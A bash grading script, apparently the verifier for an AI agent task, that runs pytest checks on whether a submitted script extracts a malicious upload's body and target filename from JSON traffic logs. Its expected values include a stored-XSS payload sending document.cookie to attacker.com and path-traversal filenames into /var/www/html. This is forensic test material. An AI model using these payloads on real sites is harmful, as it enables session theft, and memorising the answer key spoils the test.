#!/bin/bash
set -e
mkdir -p /logs/verifier
echo "0" > /logs/verifier/reward.txt

cat << 'TEST_EOF' > /tmp/test_final_state.py
import json
import os
import secrets
import stat
import subprocess

import pytest

SCRIPT = "/home/user/extract.py"
TRAFFIC = "/home/user/traffic.json"
PAYLOAD_OUT = "/home/user/extracted_payload.txt"
PATH_OUT = "/home/user/target_path.txt"


def run_script():
    result = subprocess.run(
        ["python3", SCRIPT],
        cwd="/home/user",
        text=True,
        capture_output=True,
        timeout=10,
    )
    assert result.returncode == 0, (
        f"{SCRIPT} failed with exit code {result.returncode}. "
        f"stdout: {result.stdout!r}; stderr: {result.stderr!r}"
    )


@pytest.fixture(scope="session", autouse=True)
def run_submission_on_original_traffic():
    assert os.path.lexists(SCRIPT), f"Required script {SCRIPT} does not exist."
    mode = os.lstat(SCRIPT).st_mode
    assert stat.S_ISREG(mode), f"{SCRIPT} must be a regular Python script."

    for path in (PAYLOAD_OUT, PATH_OUT):
        if os.path.lexists(path):
            os.remove(path)

    run_script()


def test_extracted_payload():
    path = "/home/user/extracted_payload.txt"
    assert os.path.isfile(path), f"File {path} does not exist. The payload was not extracted."

    with open(path, "r") as f:
        content = f.read()

    expected = "<html><body><script>fetch('http://attacker.com/steal?cookie='+document.cookie)</script></body></html>"
    assert content == expected, f"Content of {path} is incorrect. Expected: {expected}, Got: {content}"


def test_target_path():
    path = "/home/user/target_path.txt"
    assert os.path.isfile(path), f"File {path} does not exist. The malicious target path was not extracted."

    with open(path, "r") as f:
        content = f.read()

    expected = "../../../var/www/html/stored_xss.html"
    assert content == expected, f"Content of {path} is incorrect. Expected: {expected}, Got: {content}"


def test_script_parses_changed_traffic():
    token = secrets.token_hex(16)
    expected_path = f"../../../var/www/html/{token}.html"
    expected_payload = (
        f"<html><body><script>window.location='https://example.invalid/{token}?'"
        "+document.cookie</script></body></html>"
    )

    requests = [
        {
            "method": "POST",
            "endpoint": "/upload",
            "headers": {
                "Content-Type": "text/plain",
                "Content-Disposition": "form-data; name=\"file\"; filename=\"notes.txt\"",
            },
            "body": f"benign-{secrets.token_hex(8)}",
        },
        {
            "method": "GET",
            "endpoint": "/preview",
            "headers": {
                "Content-Disposition": "form-data; name=\"file\"; filename=\"../../not-a-post.html\"",
            },
            "body": "not the malicious POST payload",
        },
        {
            "method": "POST",
            "endpoint": "/upload",
            "headers": {
                "Content-Type": "text/html",
                "Content-Disposition": f"form-data; name=\"file\"; filename=\"{expected_path}\"",
            },
            "body": expected_payload,
        },
    ]
    secrets.SystemRandom().shuffle(requests)

    with open(TRAFFIC, "rb") as f:
        original_traffic = f.read()

    try:
        with open(TRAFFIC, "w", encoding="utf-8") as f:
            json.dump(requests, f)

        for path in (PAYLOAD_OUT, PATH_OUT):
            if os.path.lexists(path):
                os.remove(path)

        run_script()

        assert os.path.isfile(PAYLOAD_OUT), f"File {PAYLOAD_OUT} does not exist after running the script."
        assert os.path.isfile(PATH_OUT), f"File {PATH_OUT} does not exist after running the script."

        with open(PAYLOAD_OUT, "r") as f:
            actual_payload = f.read()
        with open(PATH_OUT, "r") as f:
            actual_path = f.read()

        assert actual_payload == expected_payload, (
            "The script did not extract the payload from the malicious request in the changed traffic."
        )
        assert actual_path == expected_path, (
            "The script did not extract the traversal filename from the malicious request in the changed traffic."
        )
    finally:
        with open(TRAFFIC, "wb") as f:
            f.write(original_traffic)
TEST_EOF

if python3 -m pytest /tmp/test_final_state.py -x --tb=short 2>&1; then
    echo "1" > /logs/verifier/reward.txt
else
    echo "0" > /logs/verifier/reward.txt
fi
